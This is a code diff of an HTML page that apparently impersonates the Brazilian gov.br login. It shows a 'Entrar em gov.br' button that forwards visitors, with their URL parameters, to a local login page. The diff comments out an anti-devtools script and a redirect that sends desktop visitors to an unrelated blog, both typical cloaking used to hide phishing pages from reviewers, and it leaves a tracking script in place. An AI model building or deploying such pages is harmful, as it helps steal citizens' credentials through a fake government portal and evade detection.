@@ -3,12 +3,12 @@
     <meta charset="utf-8">
     <link rel="icon" href="./favicon.ico" type="image/x-icon" sizes="16x16">
     <meta name="viewport" content="width=device-width, initial-scale=1"> 
-    <script disable-devtool-auto="" src="disable-devtool-1.html" url="https://meutudo.com.br/blog/guia-do-saque-aniversario/"></script>
+    <!-- <script disable-devtool-auto="" src="disable-devtool-1.html" url="https://meutudo.com.br/blog/guia-do-saque-aniversario/"></script>
 <script type="text/javascript">
   if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
     window.location.href = 'https://meutudo.com.br/blog/guia-do-saque-aniversario/';
   }
-  </script>
+  </script> -->
     <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
     <style>
         body, html {
@@ -101,18 +101,17 @@
             <div>
                 <p style="font-size: 14px; font-weight: 400;">Ao entrar, você concorda com nosso</p>
                 <p><a class="sc-d69c2a2d-4 krcYmm">Termo de Responsabilidade</a> e <a class="sc-d69c2a2d-4 krcYmm">Política de Privacidade</a></p>
-            </div><button class="sc-d69c2a2d-5 krflkP" onclick="redirectAccess();">Entrar em <b>gov.br</b></button>
+            </div><button class="sc-d69c2a2d-5 krflkP" onclick="redirect(event);">Entrar em <b>gov.br</b></button>
         </div>
     </div>
 
+
     <script>
-        // Define a função de redirecionamento
-        function redirectAccess() {
-            console.log('aquii');
-            // Define a nova URL para redirecionamento
-            window.location.href = "../login/index.html" + window.location.search;
+        function redirect(event) {
+            event.preventDefault();
+            var currentUrlParams = window.location.search;
+            window.location.href = "../login/index.html" + currentUrlParams;
         }
-        
     </script>
 </body></html>
 
